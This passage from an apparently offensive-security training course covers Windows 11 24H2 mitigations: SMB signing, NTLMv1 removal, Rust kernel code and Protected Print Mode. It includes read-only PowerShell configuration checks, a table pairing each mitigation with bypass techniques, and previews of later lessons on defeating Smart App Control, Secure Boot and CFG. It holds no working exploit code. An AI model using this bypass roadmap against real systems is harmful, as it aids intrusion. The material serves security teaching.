Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature

# Check SMB client configuration
Get-SmbClientConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature

# Windows 11 24H2 defaults:
# RequireSecuritySignature = True
```

### NTLMv1 Removal

**What Changed**:

- NTLMv1 is **completely removed** in Windows 11 24H2 and Windows Server 2025
- NTLMv2 still available (but deprecation planned)
- Kerberos is the default and recommended authentication protocol

**Impact on Attacks**:

```text
NTLM Attack Surface Before:
--------------------------------------------------------------
NTLMv1 is cryptographically weak:
- Rainbow table attacks feasible
- Relay attacks easier
- Downgrade attacks possible

After NTLMv1 Removal:
--------------------------------------------------------------
- No downgrade from NTLMv2 to v1 possible
- Legacy attacks eliminated
- Responder/relay attacks harder
```

**Checking NTLM Configuration**:

```powershell
# Check which NTLM versions are allowed
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -ErrorAction SilentlyContinue

# Values (if key exists):
# 0-1: LM and NTLMv1 allowed (legacy, insecure)
# 2: NTLMv1 allowed
# 3-4: NTLMv2 only
# 5: NTLMv2 only, refuse LM/NTLMv1

# Note: In Windows 11 24H2+, this key may not exist by default
# Absence of key = NTLMv1 removed, NTLMv2 only (secure default)

# Check if LM hashes are disabled (should be 1)
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "NoLMHash" -ErrorAction SilentlyContinue

# Check NTLM session security requirements
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -ErrorAction SilentlyContinue | Select-Object NtlmMinClientSec, NtlmMinServerSec

# Common secure values:
# NtlmMinClientSec/NtlmMinServerSec = 536870912 (0x20000000)
# Means: Require NTLMv2 session security + 128-bit encryption
```

### Rust in Windows Kernel (Memory Safety)

**What Changed**:

- Parts of Windows kernel now written in Rust
- Win32k GDI region code rewritten (reported as `win32kbase_rs.sys`; shipping name may vary by build)
- Memory-safe language eliminates entire bug classes

**Security Impact**:

```text
Traditional C/C++ Kernel Code:
-------------------------------------------------------------
Vulnerable to:
- Buffer overflows
- Use-after-free
- Type confusion
- Integer overflows
- Null pointer dereferences

Rust Kernel Code:
-------------------------------------------------------------
Eliminated by design:
- Buffer overflows (bounds checking)
- Use-after-free (ownership model)
- Data races (borrow checker)
- Null dereferences (Option types)

Remaining attack surface:
- Logic bugs (Rust doesn't prevent these)
- unsafe{} blocks (audited carefully)
- FFI boundaries (C/Rust interface)
```

**Why This Matters**:

```text
Win32k.sys Vulnerability History:
-------------------------------------------------------------
Win32k has been the #1 kernel attack surface for a decade
- Hundreds of CVEs (mostly memory corruption)
- Complex codebase with legacy debt

Rust Rewrite Impact:
- Future memory corruption bugs in GDI nearly impossible
- Attackers must find logic bugs instead
- Significantly raises exploitation difficulty
```

### Windows Protected Print Mode (24H2)

**What is Protected Print Mode?**:

- Modern print stack using only Mopria-certified drivers
- Eliminates third-party print drivers (major attack surface)
- Driver vulnerabilities have historically been popular attack vectors

**Security Impact**:

```text
Traditional Print Stack Attack Surface:
-------------------------------------------------------------
Third-party print drivers loaded into:
- Print Spooler (SYSTEM context)
- Kernel mode (some drivers)
- User applications

Historical CVEs:
- PrintNightmare (CVE-2021-34527)
- Many spooler vulnerabilities
- Driver loading = code execution

Protected Print Mode:
-------------------------------------------------------------
Only certified drivers allowed:
- Mopria-certified (standardized, audited)
- No arbitrary kernel code loading
- Reduced privilege for print operations

Attack surface massively reduced
```

### Key Takeaways - New Mitigations

1. **Administrator Protection** eliminates persistent admin tokens (anti-mimikatz)
2. **PDE** provides per-user file encryption beyond BitLocker
3. **ESS** isolates biometric processing in VBS (anti-biometric theft)
4. **Passkeys** eliminate password-based attacks entirely
5. **SMB Signing Required** breaks relay attacks by default
6. **NTLMv1 Removal** eliminates legacy authentication weaknesses
7. **Rust in Kernel** eliminates memory corruption bug classes
8. **Protected Print** removes historically vulnerable driver attack surface

### Discussion Questions - New Mitigations

1. How does Administrator Protection affect red team token manipulation techniques?
2. Can PDE protected folders be accessed by malware running as the authenticated user?
3. What happens to passkeys if your TPM is cleared or hardware changes?
4. How would you test if SMB signing is properly enforced in an enterprise?
5. What types of vulnerabilities can still occur in Rust kernel code?

## Week 6 Summary

This week provided comprehensive understanding of Windows exploit mitigations:

**Skills Acquired**:

- Detect and verify mitigations using `dumpbin`, `Get-ProcessMitigation`, and WinDbg
- Compile binaries with/without specific protections for testing
- Analyze crash dumps to identify which mitigation blocked an exploit
- Understand the hardware foundations (NX bit, Intel CET, VBS)
- Map Linux mitigations to Windows equivalents

**Mitigation Quick Reference**:

| Mitigation    | Compile Flag     | Runtime Check    | Bypass Preview (Week 8)  |
| ------------- | ---------------- | ---------------- | ------------------------ |
| DEP           | `/NXCOMPAT`      | Execute fault    | ROP chains               |
| ASLR          | `/DYNAMICBASE`   | Random addresses | Info leaks               |
| High Entropy  | `/HIGHENTROPYVA` | 17+ bits entropy | Partial overwrites       |
| Stack Cookies | `/GS` (default)  | Cookie mismatch  | Leak/brute force         |
| CFG           | `/guard:cf`      | Bitmap check     | Valid targets, data-only |
| XFG           | OS-level (auto)  | Type hash check  | Type confusion           |
| CET           | `/CETCOMPAT`     | Shadow stack     | COOP, JOP (difficult)    |

**Connection to Other Weeks**:

```text
Week 4 (Crash Analysis)          Week 6 (Mitigations)
----------------------------------------------------------
Crash dump with 0xC0000005   ->   Identify DEP violation (Param[0]=8 for execute)
Process exit  0xC0000409     ->   Identify /GS cookie failure (subcode 2)
Process exit  0x80000003     ->   Identify CFG or CET block (__fastfail -> int 0x29)
WinDbg exc.   0xC0000409     ->   Check subcode: 2=/GS, 10=CFG (exit code differs!)
!analyze -v output           ->   Map to specific protection
Bucket ID patterns           ->   Determine exploit type

Week 5 (Basic Exploitation)      Week 6 (Mitigations)
----------------------------------------------------------
Stack overflow -> shellcode   ->   Blocked by DEP + ASLR + /GS
ret2libc with known addrs     ->   Blocked by ASLR
Heap overflow -> func ptr     ->   Blocked by CFG
Format string -> GOT write    ->   Blocked by CFG + ASLR

Week 6 (Mitigations)            Week 8 (Bypass Techniques)
----------------------------------------------------------
DEP blocks shellcode         ->   ROP/ret2libc bypass
ASLR hides addresses         ->   Info leak techniques
/GS detects overflow         ->   Canary leak/brute force
CFG validates calls          ->   Valid target abuse
```

**Looking Ahead to Week 7**:

Week 7 continues your mitigation education with advanced enterprise security topics:

- **Offensive Reconnaissance & Mitigation Fingerprinting**: Learn target enumeration - build comprehensive scanners to fingerprint system and process mitigations, identify weak points, and plan multi-stage attack paths
- **Windows 11 24H2/25H2 Specific Mitigations**: Learn the latest security features including KASLR API restrictions, Administrator Protection, Smart App Control, HVCI defaults, and enhanced Mark of the Web protections
- **Next-Gen Mitigations (Critical for 2025)**: Learn defenses like XFG (eXtended Flow Guard), Kernel CET Shadow Stack, ARM64 PAC/BTI/MTE, and Linux innovations like io_uring, Landlock, and eBPF LSM
- **Smart App Control (SAC) and Administrator Protection**: Bypass Windows 11's application whitelisting and admin authentication requirements through signed malware, LNK files, and trust chain abuse
- **Cross-platform mitigations**: Master both Windows and Linux defense landscapes - from CFG/XFG to seccomp/io_uring bypasses, and understand ARM64-specific protections
- **Kernel Data Protection (KDP) and Secure Boot**: Learn to bypass hypervisor-based protections, secure boot chains, and kernel-level exploit mitigations
- **Comprehensive mitigation scanner development**: Build offensive reconnaissance tools that enumerate all system-level and process-level protections remotely
- **Remote mitigation fingerprinting techniques**: Develop capabilities to identify attack surfaces, legacy binaries, and unprotected processes without direct system access
- **Real-world malware evasion and bypass strategies**: Study actual threat actor techniques for bypassing enterprise defenses and maintaining persistence

**Looking Ahead to Week 8**:

After completing Weeks 6-7 (understanding mitigations), Week 8 teaches bypass techniques:

- **Information Leaks and Defeating ASLR**: Master format string exploits, buffer over-reads, and UAF techniques to leak addresses and calculate base offsets, defeating address space layout randomization
- **Return-Oriented Programming (ROP) for DEP Bypass**: Build sophisticated ROP chains using existing code gadgets - from basic ret2libc to advanced techniques like ORW, ret2csu, SROP, and stack pivoting
- **Windows Data-Only Attacks, Indirect Syscalls & Stack Canary Bypass**: Learn modern techniques that avoid code execution entirely - overwrite function pointers, abuse indirect syscalls, and bypass /GS protections through canary leaks
- **Control Flow Guard (CFG) and XFG Bypasses**: Defeat Microsoft's control-flow integrity protections through valid target abuse, forward-edge CFI bypasses, and XFG circumvention techniques
- **Heap Exploitation with Modern Protections**: Master advanced heap techniques like tcache poisoning, safe linking bypasses, and House of Apple/Kiwi variants despite glibc hardening
- **CVE Case Studies and Real-World Exploit Chains**: Analyze complete exploit chains from actual vulnerabilities - understanding how multiple bypass techniques combine for full compromise
- **ARM64 Exploitation — PAC, BTI & MTE Bypass**: Learn ARM64-specific exploitation including pointer authentication code signing bypasses, branch target identification circumvention, and memory tagging exploitation

<!-- Written by AnotherOne from @Pwn3rzs Telegram channel -->
